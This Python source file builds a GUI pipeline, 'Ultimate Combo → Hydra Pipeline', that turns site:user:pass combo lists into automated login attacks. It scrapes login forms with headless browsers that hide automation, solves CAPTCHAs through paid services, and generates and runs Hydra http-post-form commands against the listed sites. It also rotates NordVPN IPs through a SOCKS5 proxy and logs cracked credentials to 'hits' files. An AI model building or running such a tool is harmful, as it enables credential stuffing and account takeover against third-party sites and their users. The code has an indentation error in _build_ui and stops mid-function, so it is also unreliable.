import requests
from bs4 import BeautifulSoup
import csv
import tkinter as tk
from tkinter import filedialog, messagebox, ttk
from pathlib import Path
import os
import time
import sys
import re
import random
import json
import subprocess
from datetime import datetime
from urllib.parse import urlparse, urlunparse
import warnings
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
import zipfile

# Suppress warnings
from urllib3.exceptions import InsecureRequestWarning
warnings.simplefilter('ignore', InsecureRequestWarning)

from playwright.sync_api import sync_playwright

try:
    import cloudscraper
    HAS_CLOUDSCRAPER = True
except ImportError:
    HAS_CLOUDSCRAPER = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.common.by import By
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    from webdriver_manager.chrome import ChromeDriverManager
    HAS_SELENIUM = True
except ImportError:
    HAS_SELENIUM = False

try:
    import deathbycaptcha
    HAS_DEATHBYCAPTCHA = True
except ImportError:
    HAS_DEATHBYCAPTCHA = False

try:
    from twocaptcha import TwoCaptcha
    HAS_2CAPTCHA = True
except ImportError:
    HAS_2CAPTCHA = False

if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding='utf-8')
        sys.stderr.reconfigure(encoding='utf-8')
    except:
        pass

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0',
]

COMMON_LOGIN_PATHS = ['/login', '/signin', '/account/login', '/auth/login', '/user/login', '/session/new']

CONFIG_FILE = Path("config.json")
GOST_EXE = Path("gost.exe")
GOST_ZIP_URL = "https://github.com/ginuerzh/gost/releases/download/v3.0.0-rc.10/gost_3.0.0-rc.10_windows_amd64.zip"

def load_config():
    if CONFIG_FILE.exists():
        try:
            return json.loads(CONFIG_FILE.read_text(encoding='utf-8'))
        except:
            return {}
    return {}

config = load_config()

def save_config():
    CONFIG_FILE.write_text(json.dumps(config, indent=2), encoding='utf-8')

def download_gost():
    if GOST_EXE.exists():
        return
    print("Downloading gost...")
    zip_path = Path("gost.zip")
    with requests.get(GOST_ZIP_URL, stream=True) as r:
        r.raise_for_status()
        with zip_path.open("wb") as f:
            for chunk in r.iter_content(chunk_size=8192):
                f.write(chunk)
    with zipfile.ZipFile(zip_path, 'r') as zip_ref:
        zip_ref.extractall(".")
    for file in Path(".").glob("gost*"):
        if file.name.endswith(".exe"):
            file.rename(GOST_EXE)
            break
    zip_path.unlink(missing_ok=True)
    print("gost downloaded and extracted.")

def normalize_site(raw):
    s = str(raw).strip()
    if not s: return None
    s = re.sub(r'^[A-Z]{2}\s+', '', s, flags=re.IGNORECASE)
    s = re.sub(r'^(https?://\s*)+', '', s)
    s = re.sub(r'\s+', '', s)
    s = s.strip('/.')

    if re.match(r'^[^@]+@[^:]+:[^:]+$', s): return None

    match = re.search(r'(https?://[^\s\'"]+)', s)
    if match: s = match.group(1)

    if not s.startswith(('http://', 'https://')):
        if s.startswith('//'): s = 'https:' + s
        elif '.' in s and not s.startswith('/'): s = 'https://' + s.lstrip('/')
        else: return None

    try:
        p = urlparse(s)
        if not p.netloc or len(p.netloc) < 4: return None
        if 'referer' in p.query.lower() or len(p.query) > 150:
            p = p._replace(query='', fragment='')
        return urlunparse(p)
    except:
        return None

def get_base_url(url):
    if not url: return None
    p = urlparse(url)
    return f"{p.scheme}://{p.netloc}"

def get_site_filename(base_url):
    domain = base_url.split('//')[-1].replace('www.', '').replace('.', '_')
    return f"{domain}.txt"

def split_three_fields(line):
    parts = line.rsplit(":", 2)
    if len(parts) != 3:
        return None
    return [p.strip() for p in parts]
def detect_failure_string(soup, url):
    error_keywords = ['incorrect', 'invalid', 'failed', 'wrong', 'error', 'denied', 'try again', 'not found', 'locked', 'unsuccessful']
    error_texts = []

    for tag in soup.find_all(['div', 'span', 'p', 'label'], class_=re.compile(r'(error|alert|invalid|fail|warning|message|feedback)')):
        text = tag.get_text(strip=True).lower()
        if any(kw in text for kw in error_keywords):
            error_texts.append(text)

    form = soup.find('form')
    if form:
        form_text = form.get_text(strip=True).lower()
        for kw in error_keywords:
            if kw in form_text:
                error_texts.append(kw)

    if error_texts:
        unique_errors = list(set(error_texts))
        return f"F={'|'.join(unique_errors[:5])}"

    return "F=Invalid|wrong|failed|incorrect|error|denied|try again|not found"

def validate_login_form(form, html_content, strict=True):
    confidence = 0
    reasons = []

    method = form.get('method', 'get').lower()
    if method != 'post':
        if strict:
            return False, "method is not POST", 0
        confidence += 20
        reasons.append("non-POST method")

    action = form.get('action', '').strip()
    if not action or action in ['#', 'javascript:void(0)', 'about:blank']:
        if strict:
            return False, "invalid or empty action URL", 0
        confidence += 10
        reasons.append("suspicious action URL")

    password_fields = form.find_all('input', {'type': 'password'})
    if not password_fields:
        return False, "no password field found", 0

    confidence += 40

    user_fields = form.find_all('input', {'type': ['text', 'email']})
    if not user_fields:
        if strict:
            return False, "no username/email field found", 20
        confidence += 10
        reasons.append("no obvious username field")

    visible_inputs = [i for i in form.find_all('input') if i.get('type') not in ['hidden', 'submit']]
    if len(visible_inputs) < 2:
        if strict:
            return False, "too few visible input fields", 10
        confidence += 5
        reasons.append("few visible inputs")

    honeypot_keywords = ['honeypot', 'email_confirm', 'url', 'website', 'leaveblank']
    for inp in form.find_all('input'):
        name = (inp.get('name') or '').lower()
        style = (inp.get('style') or '').lower()
        if any(kw in name for kw in honeypot_keywords) and ('display:none' in style or 'visibility:hidden' in style):
            if strict:
                return False, "possible honeypot field detected", 0
            confidence -= 20
            reasons.append("honeypot suspicion")

    form_text = form.get_text(separator=' ', strip=True).lower()
    failure_keywords = ['incorrect', 'invalid', 'failed', 'wrong', 'error', 'try again']
    if any(kw in form_text for kw in failure_keywords):
        confidence += 20

    confidence = min(100, max(0, confidence))

    if confidence < 60 and strict:
        return False, f"low confidence ({confidence}): {', '.join(reasons)}", confidence

    return True, f"valid (confidence: {confidence})", confidence

def fetch_page_playwright(url, proxy=None):
    for attempt in range(2):
        try:
            launch_args = {'headless': True, 'args': ['--disable-blink-features=AutomationControlled']}
            if proxy:
                launch_args['proxy'] = proxy

            with sync_playwright() as p:
                browser = p.chromium.launch(**launch_args)
                context = browser.new_context(
                    viewport={'width': 1920, 'height': 1080},
                    user_agent=random.choice(USER_AGENTS),
                    locale='en-US',
                    ignore_https_errors=True,
                    java_script_enabled=True,
                    bypass_csp=True,
                )
                context.add_init_script("Object.defineProperty(navigator, 'webdriver', { get: () => undefined });")
                page = context.new_page()
                page.goto(url, wait_until='domcontentloaded', timeout=30000)
                page.wait_for_timeout(4000)
                html = page.content()
                browser.close()
                return html, None
        except Exception as e:
            err_str = str(e).lower()
            reason = "unknown"
            if 'name not resolved' in err_str:
                reason = "dns"
            elif 'connection refused' in err_str:
                reason = "refused"
            elif 'timed out' in err_str:
                reason = "timeout"
            if attempt == 1:
                print(f"Playwright failed {url}: {e}")
            time.sleep(2)
    return None, reason

def fetch_page_selenium(url):
    if not HAS_SELENIUM:
        return None, "selenium_not_installed"

    try:
        options = Options()
        options.add_argument("--headless")
        options.add_argument("--disable-blink-features=AutomationControlled")
        options.add_argument(f"user-agent={random.choice(USER_AGENTS)}")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        driver = webdriver.Chrome(ChromeDriverManager().install(), options=options)
        driver.get(url)
        time.sleep(5)
        html = driver.page_source
        driver.quit()
        return html, None
    except Exception as e:
        print(f"Selenium failed {url}: {e}")
        return None, "selenium_error"

def solve_captcha(soup, url):
    captcha_type = None
    sitekey = None

    if soup.find('div', {'class': 'g-recaptcha'}):
        captcha_type = 'recaptcha'
        sitekey = soup.find('div', {'class': 'g-recaptcha'})['data-sitekey']
    elif 'hcaptcha' in str(soup).lower():
        captcha_type = 'hcaptcha'
        sitekey = soup.find('div', {'class': 'h-captcha'})['data-sitekey']
    elif 'turnstile' in str(soup).lower():
        captcha_type = 'turnstile'
        sitekey = soup.find('div', {'class': 'cf-turnstile'})['data-sitekey']

    if not captcha_type or not sitekey:
        return None

    token = None
    if HAS_DEATHBYCAPTCHA and config.get('dbc_user') and config.get('dbc_pass'):
        try:
            client = deathbycaptcha.SocketClient(config['dbc_user'], config['dbc_pass'])
            captcha = client.decode(sitekey=sitekey, url=url, type=captcha_type)
            token = captcha['text']
        except Exception as e:
            print(f"DeathByCaptcha failed: {e}")

    if not token and HAS_2CAPTCHA and config.get('twocaptcha_key'):
        try:
            solver = TwoCaptcha(config['twocaptcha_key'])
            if captcha_type == 'recaptcha':
                token = solver.recaptcha(sitekey=sitekey, url=url)['code']
            elif captcha_type == 'hcaptcha':
                token = solver.hcaptcha(sitekey=sitekey, url=url)['code']
        except Exception as e:
            print(f"2Captcha failed: {e}")

    return token

def extract_login_form(url, proxy=None, strict_validation=True):
    html, error = fetch_page_playwright(url, proxy)
    fallback_used = False

    if not html and HAS_SELENIUM:
        html, error = fetch_page_selenium(url)
        fallback_used = True

    if not html:
        return None, error or "no_html"

    soup = BeautifulSoup(html, 'html.parser')

    captcha_token = solve_captcha(soup, url)
    if captcha_token:
        html, error = fetch_page_playwright(url, proxy)
        if html:
            soup = BeautifulSoup(html, 'html.parser')

    forms = soup.find_all('form')

    best_form = None
    best_confidence = -1
    best_reason = ""

    for form in forms:
        is_valid, reason, confidence = validate_login_form(form, html, strict=strict_validation)

        if not is_valid:
            print(f"Skipped form at {url}: {reason}")
            continue

        if confidence > best_confidence:
            best_form = form
            best_confidence = confidence
            best_reason = reason

    if not best_form:
        return None, f"no_valid_form (best confidence: {best_confidence})"

    action = best_form.get('action', '/')
    if action.startswith('/'): action = action
    elif not action: action = '/'

    if best_form.get('method', 'post').lower() != 'post':
        return None, "non_post_form_selected"

    post_parts = []
    username_field = None

    for inp in best_form.find_all('input'):
        name = inp.get('name')
        if not name: continue
        typ = inp.get('type', 'text').lower()

        if typ == 'password':
            post_parts.append(f"{name}=^PASS^")
        elif typ in ['text', 'email'] and not username_field:
            username_field = name
            post_parts.append(f"{name}=^USER^")
        elif typ not in ['submit', 'button', 'hidden']:
            post_parts.append(f"{name}=")

    for h in best_form.find_all('input', {'type': 'hidden'}):
        n = h.get('name')
        v = h.get('value', '')
        if n: post_parts.append(f"{n}={v}")

    sub = best_form.find('input', {'type': 'submit'})
    if sub:
        n = sub.get('name')
        v = sub.get('value', 'Login')
        if n: post_parts.append(f"{n}={v}")

    if not username_field:
        username_field = 'username' if 'user' in str(best_form).lower() else 'email'
        post_parts.append(f"{username_field}=^USER^")

    post_data = '&'.join(post_parts)
    failure = detect_failure_string(soup, url)

    target = urlparse(url).netloc or url
    cmd_template = f'hydra -L "{{combo_file}}" -P "{{combo_file}}" {target} http-post-form "{action}:{post_data}:F={failure}" -V -t 4 -f'

    return {
        'original_url': url,
        'action': action,
        'post_data': post_data,
        'failure_condition': failure,
        'hydra_command_template': cmd_template,
        'confidence': best_confidence,
        'validation_reason': best_reason,
        'fallback_used': fallback_used
    }, None
class CombinedParserGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("Ultimate Combo → Hydra Pipeline")
        self.root.geometry("1450x980")

        self.input_path = tk.StringVar()
        self.output_path = tk.StringVar()
        self.forms_output_path = tk.StringVar()
        self.status_text = tk.StringVar(value="Ready.")
        self.header1 = tk.StringVar(value="site")
        self.header2 = tk.StringVar(value="user")
        self.header3 = tk.StringVar(value="pass")
        self.create_combo = tk.BooleanVar(value=True)
        self.extract_forms = tk.BooleanVar(value=True)
        self.skip_blank = tk.BooleanVar(value=True)
        self.trim_whitespace = tk.BooleanVar(value=True)
        self.use_proxy = tk.BooleanVar(value=True)
        self.proxy_url = tk.StringVar(value="socks5://127.0.0.1:1080")
        self.tld_only = tk.BooleanVar(value=True)
        self.threads = tk.IntVar(value=6)
        self.strict_validation = tk.BooleanVar(value=True)

        self.pipeline_running = False
        self.pipeline_paused = False
        self.pipeline_cancelled = False
        self.gost_process = None

        self.processed_file = Path("processed_sites.json")
        self.processed_data = self.load_processed_data()

        self._build_ui()
        self.runner_tree = None
        self.hydra_log = None
        self.processing_thread = None
        self.notebook = None  # Will hold reference to the ttk.Notebook
        self.root.after(500, self.refresh_runner_list)  # slight delay to ensure widgets are ready

    def load_processed_data(self):
        if self.processed_file.exists():
            try:
                return json.loads(self.processed_file.read_text(encoding='utf-8'))
            except:
                return {}
        return {}

    def save_processed_data(self):
        self.processed_file.write_text(json.dumps(self.processed_data, indent=2), encoding='utf-8')

    def _write_log_threadsafe(self, text):
        self.root.after(0, lambda: self.log.insert(tk.END, text + "\n") or self.log.see(tk.END))

    def _update_status_threadsafe(self, text):
        self.root.after(0, lambda: self.status_text.set(text))

    def _update_progress_threadsafe(self, mode=None, maximum=None, value=None, stop=False):
        def update():
            if mode is not None: self.progress["mode"] = mode
            if maximum is not None: self.progress["maximum"] = maximum
            if value is not None: self.progress["value"] = value
            if stop: self.progress.stop()
        self.root.after(0, update)

    def _show_progress_threadsafe(self, show):
        self.root.after(0, lambda: self.progress.pack(fill="x", pady=8) if show else self.progress.pack_forget())

   def _build_ui(self):
    notebook = ttk.Notebook(self.root)
    self.notebook = notebook
    notebook.pack(fill="both", expand=True)

    extractor_tab = ttk.Frame(notebook)
    notebook.add(extractor_tab, text="Extractor")

    runner_tab = ttk.Frame(notebook)
    notebook.add(runner_tab, text="Hydra Runner")

    self.build_extractor_tab(extractor_tab)
    self.build_runner_tab(runner_tab)

    # Auto-refresh runner list when switching to Hydra Runner tab
    def on_tab_changed(event):
        selected_tab = notebook.select()
        # Runner tab is the second tab (index 1)
        if selected_tab == notebook.tabs()[1]:
            try:
                self.refresh_runner_list()
            except AttributeError:
                # Safety: if runner_tree not ready yet, skip silently
                pass

    notebook.bind("<<NotebookTabChanged>>", on_tab_changed)
    
    def build_extractor_tab(self, tab):
        main = ttk.Frame(tab, padding=12)
        main.pack(fill="both", expand=True)

        ttk.Label(main, text="Combo Parser + Advanced Form Extractor", font=("Segoe UI", 14, "bold")).pack(anchor="w", pady=(0, 8))

        io_grid = ttk.Frame(main)
        io_grid.pack(fill="x", pady=6)

        inp_f = ttk.LabelFrame(io_grid, text="Input (file or folder)", padding=10)
        inp_f.grid(row=0, column=0, sticky="nsew", padx=10)
        ttk.Entry(inp_f, textvariable=self.input_path).pack(side="left", fill="x", expand=True, padx=(0,8))
        ttk.Button(inp_f, text="File", command=self.choose_input_file).pack(side="left", padx=4)
        ttk.Button(inp_f, text="Folder", command=self.choose_input_folder).pack(side="left")

        out_f = ttk.LabelFrame(io_grid, text="Main CSV Output", padding=10)
        out_f.grid(row=0, column=1, sticky="nsew", padx=10)
        ttk.Entry(out_f, textvariable=self.output_path).pack(side="left", fill="x", expand=True, padx=(0,8))
        ttk.Button(out_f, text="Save As", command=self.choose_output_file).pack(side="left")

        forms_f = ttk.LabelFrame(io_grid, text="Hydra Forms CSV", padding=10)
        forms_f.grid(row=0, column=2, sticky="nsew", padx=10)
        ttk.Entry(forms_f, textvariable=self.forms_output_path).pack(side="left", fill="x", expand=True, padx=(0,8))
        ttk.Button(forms_f, text="Save As", command=self.choose_forms_output_file).pack(side="left")

        mid_grid = ttk.Frame(main)
        mid_grid.pack(fill="x", pady=6)

        head_f = ttk.LabelFrame(mid_grid, text="CSV Headers", padding=10)
        head_f.grid(row=0, column=0, sticky="nsew", padx=10)
        for i, txt, var in zip(range(3), ["Column 1 (site)", "Column 2 (user)", "Column 3 (pass)"], [self.header1, self.header2, self.header3]):
            ttk.Label(head_f, text=txt).grid(row=i, column=0, sticky="w", padx=6, pady=4)
            ttk.Entry(head_f, textvariable=var, width=40).grid(row=i, column=1, sticky="ew", pady=4)
        head_f.columnconfigure(1, weight=1)

        opt_f = ttk.LabelFrame(mid_grid, text="Options", padding=10)
        opt_f.grid(row=0, column=1, sticky="nsew", padx=10)
        ttk.Checkbutton(opt_f, text="Skip blank lines", variable=self.skip_blank).pack(anchor="w")
        ttk.Checkbutton(opt_f, text="Trim whitespace", variable=self.trim_whitespace).pack(anchor="w")
        ttk.Checkbutton(opt_f, text="Create user:pass combo.txt per site", variable=self.create_combo).pack(anchor="w", pady=4)
        ttk.Checkbutton(opt_f, text="Extract login forms", variable=self.extract_forms).pack(anchor="w", pady=4)
        ttk.Checkbutton(opt_f, text="Strict form validation", variable=self.strict_validation).pack(anchor="w", pady=4)

        proxy_f = ttk.LabelFrame(mid_grid, text="Proxy / VPN (NordVPN Auto)", padding=10)
        proxy_f.grid(row=0, column=2, sticky="nsew", padx=10)
        ttk.Checkbutton(proxy_f, text="Enable NordVPN Auto-Proxy + Rotation", variable=self.use_proxy).pack(anchor="w")
        ttk.Label(proxy_f, text="NordVPN token set in Settings").pack(anchor="w")

        thread_f = ttk.LabelFrame(main, text="Extraction Speed", padding=10)
        thread_f.pack(fill="x", pady=6)
        ttk.Label(thread_f, text="Threads (4-8 recommended):").pack(anchor="w")
        ttk.Scale(thread_f, from_=1, to=12, orient="horizontal", variable=self.threads, 
                  length=400, command=lambda v: self.threads.set(int(round(float(v))))).pack(fill="x", padx=8)
        ttk.Label(thread_f, textvariable=self.threads).pack(anchor="e")

        btn_f = ttk.Frame(main)
        btn_f.pack(fill="x", pady=12)
        self.start_button = ttk.Button(btn_f, text="Start Pipeline", command=self.start_pipeline)
        self.start_button.pack(side="left", padx=8)
        self.pause_button = ttk.Button(btn_f, text="Pause", command=self.toggle_pause, state="disabled")
        self.pause_button.pack(side="left", padx=8)
        self.cancel_button = ttk.Button(btn_f, text="Cancel", command=self.cancel_pipeline, state="disabled")
        self.cancel_button.pack(side="left", padx=8)
        self.retry_button = ttk.Button(btn_f, text="Retry Failed", command=self.retry_failed)
        self.retry_button.pack(side="left", padx=8)
        ttk.Button(btn_f, text="Settings", command=self.open_settings).pack(side="left", padx=8)
        ttk.Button(btn_f, text="Clear Log", command=self.clear_log).pack(side="left", padx=8)

        ttk.Label(main, textvariable=self.status_text, foreground="#0066cc").pack(anchor="w", pady=6)

        self.progress = ttk.Progressbar(main, orient="horizontal", length=960, mode="determinate")
        self.progress.pack(fill="x", pady=6)
        self.progress.pack_forget()

        log_f = ttk.LabelFrame(main, text="Log", padding=8)
        log_f.pack(fill="both", expand=True)
        self.log = tk.Text(log_f, height=22, wrap="word")
        self.log.pack(side="left", fill="both", expand=True)
        sc = ttk.Scrollbar(log_f, orient="vertical", command=self.log.yview)
        sc.pack(side="right", fill="y")
        self.log.configure(yscrollcommand=sc.set)

    def build_runner_tab(self, tab):
        frame = ttk.Frame(tab, padding=12)
        frame.pack(fill="both", expand=True)

        ttk.Label(frame, text="Hydra Runner - Select sites to attack", font=("Segoe UI", 12, "bold")).pack(anchor="w", pady=5)

        columns = ("Site", "Combos", "Last Run", "Status", "Hits")
        self.runner_tree = ttk.Treeview(frame, columns=columns, show="headings", height=15)
        for col in columns:
            self.runner_tree.heading(col, text=col)
            self.runner_tree.column(col, width=140)
        self.runner_tree.pack(fill="both", expand=True, pady=5)

        btn_frame = ttk.Frame(frame)
        btn_frame.pack(fill="x", pady=8)
        ttk.Button(btn_frame, text="Refresh List", command=self.refresh_runner_list).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Run Selected", command=self.run_selected_hydra).pack(side="left", padx=5)
        ttk.Button(btn_frame, text="Run All", command=self.run_all_hydra).pack(side="left", padx=5)

        self.hydra_log = tk.Text(frame, height=12, wrap="word")
        self.hydra_log.pack(fill="both", expand=True)

    def refresh_runner_list(self):
        for item in self.runner_tree.get_children():
            self.runner_tree.delete(item)

        for base, data in self.processed_data.items():
            combo_file = Path(get_site_filename(base))
            combo_count = data.get('combo_count', 0)
            last_run = data.get('last_processed', 'Never')
            status = "Form Found" if data.get('form_found', False) else "Failed / Pending"
            hits_file = Path(f"hits_{base.replace('.', '_')}.txt")
            hits_count = len(hits_file.read_text(encoding='utf-8').splitlines()) if hits_file.exists() else 0

            self.runner_tree.insert("", "end", values=(
                base,
                combo_count,
                last_run,
                status,
                hits_count
            ))

        self._write_log_threadsafe(f"Runner list refreshed: {len(self.processed_data)} sites loaded")

    def run_selected_hydra(self):
        selected = [self.runner_tree.item(iid)['values'][0] for iid in self.runner_tree.selection()]
        if not selected:
            messagebox.showinfo("No Selection", "Select at least one site.")
            return

        self._write_log_threadsafe(f"Starting Hydra on {len(selected)} selected sites...")
        threading.Thread(target=self.execute_hydra, args=(selected,), daemon=True).start()

    def run_all_hydra(self):
        all_sites = [self.runner_tree.item(iid)['values'][0] for iid in self.runner_tree.get_children()]
        if not all_sites:
            messagebox.showinfo("No Sites", "No sites available.")
            return

        self._write_log_threadsafe(f"Starting Hydra on all {len(all_sites)} sites...")
        threading.Thread(target=self.execute_hydra, args=(all_sites,), daemon=True).start()

    def execute_hydra(self, sites):
        for site in sites:
            if self.pipeline_cancelled:
                self._write_log_threadsafe("Hydra execution cancelled by user.")
                break

            cmd_template = self.processed_data.get(site, {}).get('hydra_command_template')
            if not cmd_template:
                self._write_log_threadsafe(f"No Hydra command found for {site} — skipping.")
                continue

            combo_file = get_site_filename(site)
            cmd = cmd_template.replace("{{combo_file}}", combo_file)

            self.hydra_log.insert(tk.END, f"\n=== Starting Hydra for {site} ===\n")
            self.hydra_log.insert(tk.END, f"Command: {cmd}\n")
            self.hydra_log.see(tk.END)

            try:
                # Try WSL first
                if os.system("wsl --version >nul 2>&1") == 0:
                    process = subprocess.Popen(
                        ["wsl", "bash", "-c", cmd],
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        bufsize=1
                    )
                else:
                    # Native fallback (assumes hydra.exe in PATH)
                    process = subprocess.Popen(
                        cmd,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.STDOUT,
                        text=True,
                        bufsize=1
                    )

                for line in iter(process.stdout.readline, ''):
                    self.hydra_log.insert(tk.END, line)
                    self.hydra_log.see(tk.END)
                    if "[DATA]" in line and "password" in line.lower():
                        with open(f"hits_{site.replace('.', '_')}.txt", "a", encoding='utf-8') as hf:
                            hf.write(line.strip() + "\n")

                process.wait()
                if process.returncode == 0:
                    self.hydra_log.insert(tk.END, f"[SUCCESS] Hydra finished for {site}\n")
                else:
                    self.hydra_log.insert(tk.END, f"[ERROR] Hydra exited with code {process.returncode} for {site}\n")

            except Exception as e:
                self.hydra_log.insert(tk.END, f"Error running Hydra for {site}: {str(e)}\n")

            self.hydra_log.insert(tk.END, f"=== Finished {site} ===\n\n")
            self.hydra_log.see(tk.END)

        self._write_log_threadsafe("Hydra run complete.")
    def open_settings(self):
        settings_window = tk.Toplevel(self.root)
        settings_window.title("Settings")
        settings_window.geometry("500x400")

        ttk.Label(settings_window, text="DeathByCaptcha Username").pack(pady=5)
        self.dbc_user = tk.StringVar(value=config.get("dbc_user", ""))
        ttk.Entry(settings_window, textvariable=self.dbc_user).pack(pady=5)

        ttk.Label(settings_window, text="DeathByCaptcha Password").pack(pady=5)
        self.dbc_pass = tk.StringVar(value=config.get("dbc_pass", ""))
        ttk.Entry(settings_window, textvariable=self.dbc_pass, show="*").pack(pady=5)

        ttk.Label(settings_window, text="NordVPN Token").pack(pady=5)
        self.nord_token = tk.StringVar(value=config.get("nord_token", ""))
        ttk.Entry(settings_window, textvariable=self.nord_token).pack(pady=5)

        ttk.Label(settings_window, text="2Captcha API Key (optional)").pack(pady=5)
        self.twocaptcha_key = tk.StringVar(value=config.get("twocaptcha_key", ""))
        ttk.Entry(settings_window, textvariable=self.twocaptcha_key).pack(pady=5)

        ttk.Button(settings_window, text="Save & Close", command=self.save_settings).pack(pady=20)

    def save_settings(self):
        config['dbc_user'] = self.dbc_user.get()
        config['dbc_pass'] = self.dbc_pass.get()
        config['nord_token'] = self.nord_token.get()
        config['twocaptcha_key'] = self.twocaptcha_key.get()
        save_config()
        messagebox.showinfo("Settings", "Settings saved.")
        self.root.destroy()

    def setup_nordvpn_proxy(self):
        try:
            if not config.get('nord_token'):
                self._write_log_threadsafe("No NordVPN token set - using no proxy")
                return None

            self._write_log_threadsafe("Setting up NordVPN + SOCKS5 proxy...")

            subprocess.run(["nordvpn", "login", "--token", config['nord_token']], capture_output=True)
            subprocess.run(["nordvpn", "connect"], capture_output=True)

            download_gost()

            self.gost_process = subprocess.Popen([str(GOST_EXE), "-L=socks5://:1080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(3)

            self._write_log_threadsafe("NordVPN SOCKS5 proxy active on 127.0.0.1:1080")
            return {"server": "socks5://127.0.0.1:1080"}

        except Exception as e:
            self._write_log_threadsafe(f"NordVPN / gost setup failed: {e}. Falling back to no proxy.")
            return None

    def rotate_nordvpn(self):
        try:
            subprocess.run(["nordvpn", "disconnect"], capture_output=True)
            subprocess.run(["nordvpn", "connect"], capture_output=True)
            self._write_log_threadsafe("Rotated NordVPN IP")
        except Exception as e:
            self._write_log_threadsafe(f"IP rotation failed: {e}")

    def choose_input_file(self):
        fp = filedialog.askopenfilename(filetypes=[("Text", "*.txt"), ("All", "*.*")])
        if fp:
            self.input_path.set(fp)
            if not self.output_path.get():
                self.output_path.set(str(Path(fp).with_suffix(".csv")))
            self._write_log_threadsafe(f"Input file: {fp}")

    def choose_input_folder(self):
        d = filedialog.askdirectory()
        if d:
            self.input_path.set(d)
            if not self.output_path.get():
                self.output_path.set(str(Path(d) / "combined.csv"))
            self._write_log_threadsafe(f"Input folder: {d}")

    def choose_output_file(self):
        fp = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if fp:
            self.output_path.set(fp)
            self._write_log_threadsafe(f"Output CSV: {fp}")

    def choose_forms_output_file(self):
        fp = filedialog.asksaveasfilename(defaultextension=".csv", filetypes=[("CSV", "*.csv")])
        if fp:
            self.forms_output_path.set(fp)
            self._write_log_threadsafe(f"Forms CSV: {fp}")

    def clear_log(self):
        self.log.delete("1.0", tk.END)

    def start_pipeline(self):
        if self.processing_thread and self.processing_thread.is_alive():
            messagebox.showinfo("Busy", "Pipeline is already running.")
            return

        self.pipeline_running = True
        self.pipeline_paused = False
        self.pipeline_cancelled = False

        self.start_button.config(state="disabled")
        self.pause_button.config(text="Pause", state="normal")
        self.cancel_button.config(state="normal")
        self.retry_button.config(state="disabled")
        self.status_text.set("Running...")

        self.processing_thread = threading.Thread(target=self.process_pipeline, daemon=True, args=(False,))
        self.processing_thread.start()

    def retry_failed(self):
        if self.processing_thread and self.processing_thread.is_alive():
            messagebox.showinfo("Busy", "Pipeline is already running.")
            return

        self.pipeline_running = True
        self.pipeline_paused = False
        self.pipeline_cancelled = False

        self.start_button.config(state="disabled")
        self.pause_button.config(text="Pause", state="normal")
        self.cancel_button.config(state="normal")
        self.retry_button.config(state="disabled")
        self.status_text.set("Retrying failed sites...")

        self.processing_thread = threading.Thread(target=self.process_pipeline, daemon=True, args=(True,))
        self.processing_thread.start()

    def toggle_pause(self):
        if not self.pipeline_running:
            return

        self.pipeline_paused = not self.pipeline_paused
        if self.pipeline_paused:
            self.pause_button.config(text="Resume")
            self.status_text.set("Paused")
        else:
            self.pause_button.config(text="Pause")
            self.status_text.set("Running...")

    def cancel_pipeline(self):
        if not self.pipeline_running:
            return

        self.pipeline_cancelled = True
        self.pipeline_paused = False
        self.status_text.set("Cancelling...")

        self.root.after(500, self.check_thread_done)

    def check_thread_done(self):
        if self.processing_thread and self.processing_thread.is_alive():
            self.root.after(500, self.check_thread_done)
        else:
            self.cleanup_after_pipeline("Cancelled by user")

    def cleanup_after_pipeline(self, final_msg):
        self.pipeline_running = False
        self.pipeline_paused = False
        self.pipeline_cancelled = False

        self.start_button.config(state="normal")
        self.pause_button.config(state="disabled")
        self.cancel_button.config(state="disabled")
        self.retry_button.config(state="normal")
        self.status_text.set(final_msg)
        messagebox.showinfo("Pipeline Status", final_msg)

        if self.gost_process:
            self.gost_process.terminate()
            self.gost_process = None
        subprocess.run(["nordvpn", "disconnect"], capture_output=True)
        self.save_processed_data()

    def process_pipeline(self, retry_failed_only=False):
        try:
            input_str = self.input_path.get().strip()
            out_csv = self.output_path.get().strip()
            forms_csv = self.forms_output_path.get().strip()

            if not input_str or not out_csv:
                self.root.after(0, lambda: messagebox.showerror("Error", "Input and main output required."))
                self.cleanup_after_pipeline("Failed - Missing input/output")
                return

            if self.extract_forms.get() and not forms_csv:
                self.root.after(0, lambda: messagebox.showerror("Error", "Forms output required."))
                self.cleanup_after_pipeline("Failed - Missing forms output")
                return

            in_path = Path(input_str)
            out_path = Path(out_csv)
            forms_path = Path(forms_csv) if self.extract_forms.get() else None

            headers = [self.header1.get().strip(), self.header2.get().strip(), self.header3.get().strip()]
            if any(not h for h in headers):
                self.root.after(0, lambda: messagebox.showerror("Error", "All headers required."))
                self.cleanup_after_pipeline("Failed - Missing headers")
                return

            input_files = [in_path] if in_path.is_file() else list(in_path.glob("*.txt"))
            if not input_files:
                self.root.after(0, lambda: messagebox.showerror("Error", "No .txt files found."))
                self.cleanup_after_pipeline("Failed - No input files")
                return

            rows = []
            skipped = 0
            site_combos = {}

            self._write_log_threadsafe("Collecting data...")
            self._update_status_threadsafe("Collecting...")
            self._update_progress_threadsafe(mode="indeterminate")
            self._show_progress_threadsafe(True)

            for file in input_files:
                self._write_log_threadsafe(f"Parsing: {file.name}")
                with file.open("r", encoding="utf-8", errors="replace") as f:
                    for ln, raw in enumerate(f, 1):
                        if self.pipeline_cancelled:
                            self.cleanup_after_pipeline("Cancelled during data collection")
                            return

                        while self.pipeline_paused:
                            time.sleep(0.5)
